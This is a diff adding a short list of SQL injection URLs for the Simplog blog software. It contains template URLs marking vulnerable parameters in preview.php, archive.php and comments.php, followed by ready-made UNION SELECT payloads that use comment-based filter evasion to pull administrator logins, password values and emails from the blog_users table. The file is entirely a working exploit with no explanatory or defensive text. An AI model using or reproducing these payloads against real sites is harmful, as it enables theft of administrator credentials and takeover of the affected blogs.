@@ -1,0 +1,10 @@
+http://[victim]/[simplogdir]/preview.php?adm=tem&amp;blogid=1&amp;tid=[SQL]
+http://[victim]/[simplogdir]/archive.php?blogid=1&amp;cid=[SQL]
+http://[victim]/[simplogdir]/archive.php?blogid=1&amp;pid=[SQL]
+http://[victim]/[simplogdir]/archive.php?blogid=1&amp;eid=[SQL]
+
+http://www.example.com/preview.php?adm=tem&amp;blogid=1&amp;tid=-1/**/UNION/**/SELECT/**/concat(25552,login,25553,password,25554)/**/from/**/blog_users/**/where/**/admin=1/*
+http://www.example.com/archive.php?blogid=1&amp;cid=-1/**/UNION/**/SELECT/**/0,null,0,email,0,0,login,password,0,admin,0/**/from/**/blog_users/**/where/**/admin=1/*
+http://www.example.com/archive.php?blogid=1&amp;pid=-1/**/UNION/**/SELECT/**/0,null,0,email,0,0,login,password,0,admin,0/**/from/**/blog_users/**/where/**/admin=1/*
+http://www.example.com/archive.php?blogid=1&amp;eid=-1/**/UNION/**/SELECT/**/0,null,0,email,0,0,login,password,0,admin,0/**/from/**/blog_users/**/where/**/admin=1/*
+http://www.example.com/comments.php?blogid=1&amp;pid=-1/**/UNION/**/SELECT/**/0,null,0,email,0,0,login,password,0,admin,0/**/from/**/blog_users/**/where/**/admin=1/*
